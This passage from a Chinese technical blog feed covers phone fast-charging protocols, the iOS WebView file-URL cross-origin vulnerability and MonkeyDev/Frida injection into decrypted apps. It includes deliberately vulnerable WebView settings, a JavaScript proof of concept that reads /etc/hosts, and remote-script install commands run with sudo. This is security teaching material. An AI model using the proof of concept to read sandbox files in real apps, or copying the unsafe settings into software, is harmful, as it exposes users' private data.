title="二、适配器的功率提供能力"></a>二、适配器的功率提供能力</h3><p>在不考虑接口承受能力的情况下，20W功率对适配器来说是轻而易举。但是传统的MicroUSB接口，在标准规范里面最大电流承载能力是2A，最高电压是5.25V。仅仅有10.5W，无法达到20W的要求。怎么解决这个问题呢？显然有两种解决方案，增大电流，或者提升电压。</p><p>如果不改动物理接口，增大电流是不可能的选项，所以，提升电压，是MicroUSB时代的唯一选项，这就是<strong>高通QC</strong>快速充电方法的由来。所以，我们可以看到，1.5A是QC标准比较推荐的电流，因为<strong>2A是MicroUSB的极限</strong>，业界的普遍共识是，不要把器件用到极限值，而是要预留余量。在这方面，OPPO与高通走了相反的道路，他们给MicroUSB在物理上打了补丁，增加了额外的接触针，专门用来传输大电流。最大充电电流达到了4.5A，但是电压维持在5V不变。同样达到了超过20W的功率传输。而Type-C接口的出现，让这个问题不再存在，因为<strong>TYPE-C口最高支持5A输入电流</strong>，完全能够满足现有手机电池的快速充电需求。</p><h3 id="三、手机的充电管理及散热能力"><a href="#三、手机的充电管理及散热能力" class="headerlink" title="三、手机的充电管理及散热能力"></a>三、手机的充电管理及散热能力</h3><p>充电管理，必然涉及到电压变换，恒流控制等环节，带来充电效率的下降和散热问题。因此，理论上最佳的充电设计方案是，手机内部不做充电管理，完全交给外部适配器去控制。在这一点上，QC是比较吃亏的，因为高电压低电流输入，必然导致手机内部要进行能量转换，变为低电压和大电流。这会带来手机散热上的大问题。所以，从技术的角度来看，QC的历史局限性，已经凸显。</p><p>更为严重的问题是，TYPE-C接口和USBPD中都严禁采用除USBPD以外的方式来调整充电电压。高通为此做出了很大的努力去说服USB-IF组织，试图在TYPE-C接口中，让QC和PD同时存在。但是，很可惜，被无情的拒绝了，最新的TYPE-C1.2和USBPD3.0维持了关于这一特性的描述。因此，QC不论在技术上还是在理论上，都将面临着被淘汰的危险。当然，高通自身是很清楚这一趋势的。因此，已经在最新的处理器内核中，集成了USBPD的协商功能。</p><h2 id="PD协议"><a href="#PD协议" class="headerlink" title="PD协议"></a>PD协议</h2><p>USB-PD是USB Power Delivery的缩写，PD协议是目前主流的快充协议之一，是由USB-IF组织制定的一种快速充电规范。市面上的苹果三星华为小米谷歌等等比较新的旗舰机，基本都可以兼容PD 3.0。</p><p>USB-PD的通信是将协议层的消息调制成24MHZ的FSK信号并耦合到VBUS上或者从VBUS上获得FSK信号来实现手机和充电器通信的过程。<br><a href="http://file.elecfans.com/web1/M00/48/46/pIYBAFqofqCARgD1AAAm--4DcJY458.jpg" target="_blank" rel="noopener">http://file.elecfans.com/web1/M00/48/46/pIYBAFqofqCARgD1AAAm--4DcJY458.jpg</a><br><img src="/images/pasted-56.png" alt="upload successful"></p><p><strong>PD协议和Type C的区别：</strong><br>USBPD是在一条线缆中同时支持高达100W电力传输和数据通信的协议规范，而USB Type-C则是一个全新的正反插USB连接器规范。在USBType-C端口中实现了USBPD，它就能支持USBPD规范中定义的100W功率（5V20A），但拥有USB Type-C端口并不一定意味着它支持USBPD。</p><p><img src="/images/pasted-59.png" alt="upload successful"></p><p><strong>PD 3.0收编QC 4.0</strong><br>USB-IF组织发布了USB PD 3.0的重要更新，正式推出旨在一统快速充电技术规范的PPS(Programmable Power Supply)，成功收编了高通的QC4.0，并与国家工信部的泰尔实验室达成了共识，预计将与国标实现统一。</p><p>智能手机进入大屏时代，原有的5V2A micro usb充电极限已经无法满足用户的需求。但是，作为USB协议的制定者USB-IF却没有给出解决办法。这为后来的快速充电技术标准混战埋下了伏笔。于是，高通利用自己的行业地位，开始力推QC2.0和QC3.0，向9V/2A, 12V/1.5A快速充电技术路线进发。但是，不同于非盈利组织定位的USB-IF，高通发布的技术标准都是围绕自己的产品生态和商业利益展开的。因此，纷争不可避免，战火从此点燃。OPPO，MTK，华为，TI等公司相继推出了自己的快速充电标准，试图分得一杯羹。于是，USB-IF在原有的USB PD2.0和USB PD3.0基础上，通过与高通、泰尔实验室以及国内主流手机厂商的多方沟通。终于推出了PPS来满足各方的诉求(或者说是互相妥协)，并明确规定，USB接口不允许通过非USB PD的协议来实现电压调整。从此，快速充电标准，有望走向统一。</p><h2 id="QC协议"><a href="#QC协议" class="headerlink" title="QC协议"></a>QC协议</h2><p>Quick Charge，简写QC，又称QC快充，美商高通公司（Qualcomm）骁龙系统芯片（SnapDragon SoC）中的快速充电技术，目前已经由1.0维护到4.0。</p><p><a href="https://pic4.zhimg.com/v2-660a3ea029ebe6cc2b7af7f29c7579b7_r.jpg" target="_blank" rel="noopener">https://pic4.zhimg.com/v2-660a3ea029ebe6cc2b7af7f29c7579b7_r.jpg</a><br><img src="/images/pasted-58.png" alt="upload successful"></p><h2 id="QI协议"><a href="#QI协议" class="headerlink" title="QI协议"></a>QI协议</h2><p>Qi（发音与命名来自中文字“气”），是一种由无线充电联盟（英语：Wireless Power Consortium，缩写WPC[1]）所制定的短距离（40mm, 1.6英寸[2]）低功率无线感应式电力传输的互连标准，主要目的是提供移动电话手机与其他便携式电子设备便利与通用的无线充电。</p><p>参考资料：</p><ol><li>充电头网 <a href="http://www.chongdiantou.com/" target="_blank" rel="noopener">http://www.chongdiantou.com/</a></li><li>一文看懂pd协议和qc协议的区别 <a href="http://www.elecfans.com/d/647129.html" target="_blank" rel="noopener">http://www.elecfans.com/d/647129.html</a></li><li><a href="http://www.chongdiantou.com/wp/archives/10209.html" target="_blank" rel="noopener">http://www.chongdiantou.com/wp/archives/10209.html</a></li></ol>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>iOS应用安全 —— WebView安全</title>
      <link href="/2018/06/25/iOS%E5%BA%94%E7%94%A8%E6%B2%99%E7%AE%B1/"/>
      <url>/2018/06/25/iOS%E5%BA%94%E7%94%A8%E6%B2%99%E7%AE%B1/</url>
      
        <content type="html"><![CDATA[<p>WebView是iOS用于显示网页的控件，是一个基于Webkit引擎、展现web页面的控件。WebView控件功能除了具有一般View的属性和设置外，还可对URL请求、页面加载、渲染、页面交互进行处理。</p><p>iOS下的Webview有UIWebView和WKWebView两种，其中UIWebView在iOS 8之后已经不推荐使用（<a href="https://developer.apple.com/documentation/uikit/uiwebview?changes=_6）,但仍然有很多APP使用UIWebView。" target="_blank" rel="noopener">https://developer.apple.com/documentation/uikit/uiwebview?changes=_6）,但仍然有很多APP使用UIWebView。</a></p><h2 id="File跨域漏洞"><a href="#File跨域漏洞" class="headerlink" title="File跨域漏洞"></a>File跨域漏洞</h2><p><strong>UIWebView 此漏洞默认存在， WKWebView如果使用了不恰当的方式比如 [configuration.preferences setValue:@”TRUE” forKey:@”allowFileAccessFromFileURLs”]; 也会存在漏洞</strong></p><p>攻击者可利用App文件下载机制将恶意文件写入沙盒内并诱导用户打开，当用户打开恶意文件时，其中的恶意代码可通过AJAX向“file://”域发起请求，从而远程获取App沙盒内所有的本地敏感数据。</p><h3 id="UIWebView"><a href="#UIWebView" class="headerlink" title="UIWebView"></a>UIWebView</h3><p>UIWebView虽然已经被遗弃，但依然还有很多app继续使用，且最新版本的iOS也会兼容UIWebView。由于UIWebView本身存在严重的跨域漏洞，所以只要使用UIWebView都有可能存在跨域漏洞。</p><p>漏洞原因在于UIWebView的WebKitAllowUniversalAccessFromFileURLs和WebKitAllowFileAccessFromFileURLs默认开启，导致通过js可以访问沙箱内的文件，甚至可以静默上传文件到远端。</p><p>漏洞代码示例：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">UIWebView* uiweb = [[UIWebView alloc] initWithFrame:self.view.frame];</span><br><span class="line">uiweb.center = self.view.center;</span><br><span class="line">// 打开本地html文件</span><br><span class="line">NSString *resourcePath = [[NSBundle mainBundle] resourcePath];</span><br><span class="line">NSString *filePath =[resourcePath stringByAppendingPathComponent:@&quot;index.html&quot;];</span><br><span class="line">NSMutableString *htmlstring=[[NSMutableString alloc] initWithContentsOfFile:filePath  encoding:NSUTF8StringEncoding error:nil];</span><br><span class="line">NSURL *baseUrl=[NSURL fileURLWithPath:[[NSBundle mainBundle] bundlePath]];</span><br><span class="line">[uiweb loadHTMLString:htmlstring baseURL:baseUrl];</span><br><span class="line">[self.view addSubview:uiweb];</span><br></pre></td></tr></table></figure></p><p>PoC代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">var localfile = &quot;file:///etc/hosts&quot;</span><br><span class="line">var xhr = new XMLHttpRequest();</span><br><span class="line">xhr.onreadystatechange=function()</span><br><span class="line">    &#123;</span><br><span class="line">        if (xhr.readyState==4)</span><br><span class="line">        &#123;</span><br><span class="line">              alert(xhr.responseText);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    try &#123;</span><br><span class="line">        xhr.open(&quot;GET&quot;, localfile, true);</span><br><span class="line">        xhr.send();</span><br><span class="line">    &#125;</span><br><span class="line">    catch (ex) &#123;</span><br><span class="line">            alert(ex.message);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p>被攻击者点击打开文件后，应用默认使用UIWebView进行加载，结果如下图：</p><p><img src="/images/pasted-54.png" alt="upload successful"></p><p>如果将localfile设置为”/User/Media/DCIM/100APPLE/xxx.JPG”即可以打开本地照片，设置成相对路径即可打开沙盒内的任意文件。</p><p>修复方式是使用WKWebView替换UIWebView，并做好配置，因为WKWebView也不是绝对安全。</p><h3 id="WKWebView"><a href="#WKWebView" class="headerlink" title="WKWebView"></a>WKWebView</h3><p>WKWebView默认allowFileAccessFromFileURLs和allowUniversalAccessFromFileURLs选项为false，但如果开发者开启了这两个API，同样存在跨域漏洞。</p><p>需要注意的是allowFileAccessFromFileURLs和allowUniversalAccessFromFileURLs任意一个API设置为true，都会存在漏洞。另外，在OC中两个API的调用不同且均为私有API，详见以下代码。</p><p>漏洞代码示例：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">//配置WKWebView设置allowFileAccessFromFileURLs 为true</span><br><span class="line">    WKWebViewConfiguration * configuration = [[WKWebViewConfiguration alloc] init];</span><br><span class="line">    //[configuration.preferences setValue:@TRUE forKey:@&quot;allowFileAccessFromFileURLs&quot;];</span><br><span class="line">    [configuration setValue:@TRUE forKey:@&quot;allowUniversalAccessFromFileURLs&quot;];</span><br><span class="line">    WKWebView *wkweb = [[WKWebView alloc] initWithFrame:self.view.frame configuration:configuration];</span><br><span class="line">    wkweb.center = self.view.center;</span><br><span class="line">    wkweb.UIDelegate = self;//代理，需要实现alert</span><br><span class="line">    [self.view addSubview:wkweb];</span><br><span class="line">    </span><br><span class="line">    NSString *resourcePath = [[NSBundle mainBundle] resourcePath];</span><br><span class="line">    NSString *filePath =[resourcePath stringByAppendingPathComponent:@&quot;index.html&quot;];</span><br><span class="line">    NSMutableString *htmlstring=[[NSMutableString alloc] initWithContentsOfFile:filePath  encoding:NSUTF8StringEncoding error:nil];</span><br><span class="line">    NSURL *baseUrl=[NSURL fileURLWithPath:[[NSBundle mainBundle] bundlePath]];</span><br><span class="line">    [wkweb loadHTMLString:htmlstring baseURL:baseUrl];</span><br></pre></td></tr></table></figure></p><p>开启API后执行结果如下：</p><p><img src="/images/pasted-55.png" alt="upload successful"></p><p>参考资料：</p><ol><li>CNNVD 关于iOS平台WebView组件跨域漏洞情况的通报 <a href="https://mp.weixin.qq.com/s/ZBMCgoQnYIUHVjrUHOlv4g" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/ZBMCgoQnYIUHVjrUHOlv4g</a></li><li><a href="https://bugs.webkit.org/show_bug.cgi?id=154916" target="_blank" rel="noopener">https://bugs.webkit.org/show_bug.cgi?id=154916</a></li><li><a href="https://developer.apple.com/documentation/webkit/wkwebview" target="_blank" rel="noopener">https://developer.apple.com/documentation/webkit/wkwebview</a></li></ol><h2 id="OC和js的相互调用"><a href="#OC和js的相互调用" class="headerlink" title="OC和js的相互调用"></a>OC和js的相互调用</h2><h3 id="OC调用js"><a href="#OC调用js" class="headerlink" title="OC调用js"></a>OC调用js</h3><h4 id="UIWebView-1"><a href="#UIWebView-1" class="headerlink" title="UIWebView"></a>UIWebView</h4><ul><li><p>1.<strong>stringByEvaluatingJavaScriptFromString</strong><br>该方法不能判断调用了一个js方法之后，是否发生了错误。当错误发生时，返回值为nil，而当调用一个方法本身没有返回值时，返回值也为nil，所以无法判断是否调用成功了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"> NSString *str = [uiweb stringByEvaluatingJavaScriptFromString:@&quot;document.location.href=&apos;https://www.baidu.com&apos;;&quot;</span><br><span class="line"> &quot;document.title=&apos;test&apos;;&quot;</span><br><span class="line">&quot;setTimeout(document.write(&apos;aaaa&apos;),9000);&quot;];</span><br><span class="line">    NSLog(@&quot;%@&quot;,str);</span><br></pre></td></tr></table></figure></li><li><p>2.<strong>JavaScriptCore（iOS 7.0 +）</strong><br>WebKit有一个内嵌的js环境，一般我们在页面加载完成之后，获取js上下文，然后通过JSContext的evaluateScript:方法来获取返回值。因为该方法得到的是一个JSValue对象，所以支持JavaScript的Array、Number、String、对象等数据类型。</p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">JSContext *jsContext = [uiwebView valueForKeyPath:@&quot;documentView.webView.mainFrame.javaScriptContext&quot;];</span><br><span class="line">JSValue *value = [jsContext evaluateScript:@&quot;document.write(&apos;http://www.qq.com&apos;)&quot;];</span><br><span class="line">NSLog(@&quot;%@&quot;,value.toString);</span><br></pre></td></tr></table></figure><h4 id="WKWebView-1"><a href="#WKWebView-1" class="headerlink" title="WKWebView"></a>WKWebView</h4><p>WKWebView提供了一个evaluateJavaScript的方法<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-(void)evaluateJavaScript:(NSString *)javaScriptString completionHandler:(void (^ _Nullable)(_Nullable id result, NSError * _Nullable error))completionHandler;</span><br></pre></td></tr></table></figure></p><p>实例代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[self.webView evaluateJavaScript:@&quot;document.title&quot; completionHandler:^(id _Nullable title, NSError * _Nullable error) &#123;</span><br><span class="line">        NSLog(@&quot;调用evaluateJavaScript异步获取title：%@&quot;, title);</span><br><span class="line">&#125;];</span><br></pre></td></tr></table></figure></p><h3 id="js调用OC"><a href="#js调用OC" class="headerlink" title="js调用OC"></a>js调用OC</h3><h4 id="UIWebView-2"><a href="#UIWebView-2" class="headerlink" title="UIWebView"></a>UIWebView</h4><ul><li><ol><li><strong>拦截自定义scheme</strong></li></ol></li></ul><p>比如m4bln://。方法是在html或者js中，点击某个按钮触发事件时，跳转到自定义URL Scheme构成的链接，而OC中捕获该链接，从中解析必要的参数，实现JS到OC的一次交互。比如页面中一个a标签，链接如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;m4bln://login?aaa=xxx&quot;&gt;</span><br></pre></td></tr></table></figure></p><p>OC代码实现如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">-(BOOL)webView:(UIWebView *)webView shouldStartLoadWithRequest:(NSURLRequest *)request navigationType:(UIWebViewNavigationType)navigationType</span><br><span class="line">&#123;</span><br><span class="line">    //标准的URL包含scheme、host、port、path、query、fragment等</span><br><span class="line">    NSURL *URL = request.URL;</span><br><span class="line">    if ([URL.scheme isEqualToString:@&quot;m4bln&quot;]) &#123;</span><br><span class="line">        if ([URL.host isEqualToString:@&quot;login&quot;]) &#123;</span><br><span class="line">            NSLog(@&quot;js参数为 %@&quot;, URL.query);</span><br><span class="line">            return NO;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return YES;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><ul><li>2.<strong>JavaScriptCore（iOS 7.0 +）</strong></li></ul><p>利用JavaScriptCore，在页面加载完成时，先获取js上下文。获取到之后，我们就可以进行强大的方法映射了。<br>例如，前端调用share方法：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">function share(title, imgUrl, link) &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>对应的OC代码为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">-(void)webViewDidFinishLoad:(UIWebView *)webView</span><br><span class="line">&#123;</span><br><span class="line">   //获取该UIWebview的javascript上下文</span><br><span class="line">    //self持有jsContext</span><br><span class="line">    //@property (nonatomic, strong) JSContext *jsContext;</span><br><span class="line">    self.jsContext = [self.webView valueForKeyPath:@&quot;documentView.webView.mainFrame.javaScriptContext&quot;];</span><br><span class="line">    </span><br><span class="line">    //js调用oc</span><br><span class="line">    //其中share就是js的方法名称，赋给是一个block 里面是oc代码</span><br><span class="line">    //此方法最终将打印出所有接收到的参数，js参数是不固定的</span><br><span class="line">    self.jsContext[@&quot;share&quot;] = ^() &#123;</span><br><span class="line">        NSArray *args = [JSContext currentArguments];//获取到share里的所有参数</span><br><span class="line">        //args中的元素是JSValue，需要转成OC的对象</span><br><span class="line">        NSMutableArray *messages = [NSMutableArray array];</span><br><span class="line">        for (JSValue *obj in args) &#123;</span><br><span class="line">            [messages addObject:[obj toObject]];</span><br><span class="line">        &#125;</span><br><span class="line">        NSLog(@&quot;点击分享js传回的参数：\n%@&quot;, messages);</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="WKWebView-2"><a href="#WKWebView-2" class="headerlink" title="WKWebView"></a>WKWebView</h4><ul><li>1.<strong>拦截自定义scheme</strong></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">-(void)webView:(WKWebView *)webView decidePolicyForNavigationAction:(WKNavigationAction *)navigationAction decisionHandler:(void (^)(WKNavigationActionPolicy))decisionHandler &#123;</span><br><span class="line">    //可以通过navigationAction.navigationType获取跳转类型，如新链接、后退等</span><br><span class="line">    NSURL *URL = navigationAction.request.URL;</span><br><span class="line">    //判断URL是否符合自定义的URL Scheme</span><br><span class="line">    if ([URL.scheme isEqualToString:@&quot;darkangel&quot;]) &#123;</span><br><span class="line">        //根据不同的业务，来执行对应的操作，且获取参数</span><br><span class="line">        if ([URL.host isEqualToString:@&quot;smsLogin&quot;]) &#123;</span><br><span class="line">            NSString *param = URL.query;</span><br><span class="line">            NSLog(@&quot;短信验证码登录, 参数为%@&quot;, param);</span><br><span class="line">            decisionHandler(WKNavigationActionPolicyCancel);</span><br><span class="line">            return;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    decisionHandler(WKNavigationActionPolicyAllow);</span><br><span class="line">    NSLog(@&quot;%@&quot;, NSStringFromSelector(_cmd));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>2.scriptMessageHandler</li></ul><p>(1) 创建WKWebViewConfiguration对象，配置各个API对应的MessageHandler。<br>(2) 创建WKWebView。<br>(3) 实现协议方法。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">//首先别忘了，在configuration中的userContentController中添加scriptMessageHandler</span><br><span class="line">[controller addScriptMessageHandler:self name:@&quot;shareNew&quot;]; //记得适当时候remove</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//点击a标签时，则会调用下面的方法</span><br><span class="line">#pragma mark - WKScriptMessageHandler </span><br><span class="line"></span><br><span class="line">-(void)userContentController:(WKUserContentController *)userContentController didReceiveScriptMessage:(WKScriptMessage *)message &#123;</span><br><span class="line">    if ([message.name isEqualToString:@&quot;shareNew&quot;]) &#123;</span><br><span class="line">        NSDictionary *shareData = message.body;</span><br><span class="line">        NSLog(@&quot;shareNew分享的数据为： %@&quot;, shareData);</span><br><span class="line">        //模拟异步回调</span><br><span class="line">        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(4 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^&#123;</span><br><span class="line">            //读取js function的字符串</span><br><span class="line">            NSString *jsFunctionString = shareData[@&quot;result&quot;];</span><br><span class="line">            //拼接调用该方法的js字符串</span><br><span class="line">            NSString *callbackJs = [NSString stringWithFormat:@&quot;(%@)(%d);&quot;, jsFunctionString, NO];    //后面的参数NO为模拟分享失败</span><br><span class="line">            //执行回调</span><br><span class="line">            [self.webView evaluateJavaScript:callbackJs completionHandler:^(id _Nullable result, NSError * _Nullable error) &#123;</span><br><span class="line">                if (!error) &#123;</span><br><span class="line">                    NSLog(@&quot;模拟回调，分享失败&quot;);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;];</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>参考链接：</p><ol><li>iOS中UIWebView与WKWebView、JavaScript与OC交互  <a href="https://www.jianshu.com/p/ac45d99cf912" target="_blank" rel="noopener">https://www.jianshu.com/p/ac45d99cf912</a></li></ol>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>iOS应用安全 —— MonkeyDev的使用</title>
      <link href="/2018/06/19/iOS%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8-%E2%80%94%E2%80%94-MonkeyDev/"/>
      <url>/2018/06/19/iOS%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8-%E2%80%94%E2%80%94-MonkeyDev/</url>
      
        <content type="html"><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>MonkeyDev的功能主要如下：</p><ul><li>可以使用Xcode开发CaptainHook Tweak、Logos Tweak 和 Command-line Tool，在越狱机器开发插件，这是原来iOSOpenDev功能的迁移和改进。</li><li>只需拖入一个砸壳应用，自动集成class-dump、restore-symbol、Reveal、Cycript和注入的动态库并重签名安装到非越狱机器。</li><li>支持调试自己编写的动态库和第三方App</li><li>支持通过CocoaPods第三方应用集成SDK以及非越狱插件，简单来说就是通过CocoaPods搭建了一个非越狱插件商店。</li></ul><p>MonkeyDev wiki: <a href="https://github.com/AloneMonkey/MonkeyDev/wiki" target="_blank" rel="noopener">https://github.com/AloneMonkey/MonkeyDev/wiki</a></p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><ul><li><p>安装最新的theos</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo git clone --recursive https://github.com/theos/theos.git /opt/theos</span><br></pre></td></tr></table></figure></li><li><p>安装ldid</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">brew install ldid</span><br></pre></td></tr></table></figure></li><li><p>安装MonkeyDev</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo /bin/sh -c &quot;$(curl -fsSL https://raw.githubusercontent.com/AloneMonkey/MonkeyDev/master/bin/md-install)&quot;</span><br></pre></td></tr></table></figure></li></ul><p>更新MonkeyDev<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo /bin/sh -c &quot;$(curl -fsSL https://raw.githubusercontent.com/AloneMonkey/MonkeyDev/master/bin/md-update)&quot;</span><br></pre></td></tr></table></figure></p><p>参考<a href="https://github.com/AloneMonkey/MonkeyDev/wiki/%E5%AE%89%E8%A3%85" target="_blank" rel="noopener">https://github.com/AloneMonkey/MonkeyDev/wiki/%E5%AE%89%E8%A3%85</a></p><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>安装完成之后，打开Xcode，新建一个项目，滑动到最下方可以看到MonkeyDev提供的模块:</p><p><img src="/images/pasted-47.png" alt="upload successful"></p><h2 id="非越狱下注入Frida"><a href="#非越狱下注入Frida" class="headerlink" title="非越狱下注入Frida"></a>非越狱下注入Frida</h2><h3 id="1-准备好砸壳后的app"><a href="#1-准备好砸壳后的app" class="headerlink" title="1.准备好砸壳后的app"></a>1.准备好砸壳后的app</h3><p>从pp助手、iphonecake等下载砸壳后的应用，也可以在其他越狱的手机上砸壳</p><h3 id="2-创建MonkeyApp项目"><a href="#2-创建MonkeyApp项目" class="headerlink" title="2.创建MonkeyApp项目"></a>2.创建MonkeyApp项目</h3><p>新建一个MonkeyApp项目，然后填写Product Name，对于非越狱设备可以不用管Target App，如果是越狱设备的话可以在Target App填写目标App的名字或者bundle id，工具将会自动使用frida-ios-dump提取ipa文件</p><p>这里创建的项目是monkeydev_test,得到如下结构：</p><p>monkeydev_testDylib这个是将被注入目标App的动态库，自己要hook的代码可以在monkeydev_testDylib.m文件里面写，默认项目写了一些Demo代码，支持OC runtime的HOOK，C函数的fishhook。还支持theos logtweak的写法！ 直接写在monkeydev_testDylib.m文件文件即可。</p><p>Config 这个是cycript的一些脚本下载以及methodtrace配置代码。</p><p>LLDBTools 这个是用于LLDB调试的代码，比如po pviews()。</p><p>AntiAntiDebug 这个里面是反反调试的代码。</p><p>fishhook 这个是自动集成的fishhook模块。</p><p>创建的项目已经自动集成了RevealServer.framework和libcycript.dylib，如果选择Release编译的话是不会集成的。</p><p><img src="/images/pasted-49.png" alt="upload successful"></p><h3 id="3-拖入编译"><a href="#3-拖入编译" class="headerlink" title="3.拖入编译"></a>3.拖入编译</h3><p>(1) 右键项目里面的TargetApp文件夹Show in Finder，把ipa文件拖入下面的位置(当然app文件夹也可以的):</p><p><img src="/images/pasted-50.png" alt="upload successful"></p><p>(2) 从FridaGadget.dylib下载动态库增加到App最后的Copy Files里面:</p><p><img src="/images/pasted-51.png" alt="upload successful"></p><p>(3) 将FridaGadget.dylib链接到MonkeyDev注入动态库的依赖里面</p><p><img src="/images/pasted-52.png" alt="upload successful"></p><p>编译后运行app, 如果启动日志有: Frida: Listening on 127.0.0.1 TCP port 27042 就集成成功：</p><p><img src="/images/pasted-53.png" alt="upload successful"></p>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>iOS应用安全 —— 非越狱下使用Frida</title>
      <link href="/2018/06/18/iOS%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8-%E2%80%94%E2%80%94-%E9%9D%9E%E8%B6%8A%E7%8B%B1%E4%B8%8B%E4%BD%BF%E7%94%A8Frida/"/>
      <url>/2018/06/18/iOS%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8-%E2%80%94%E2%80%94-%E9%9D%9E%E8%B6%8A%E7%8B%B1%E4%B8%8B%E4%BD%BF%E7%94%A8Frida/</url>
      
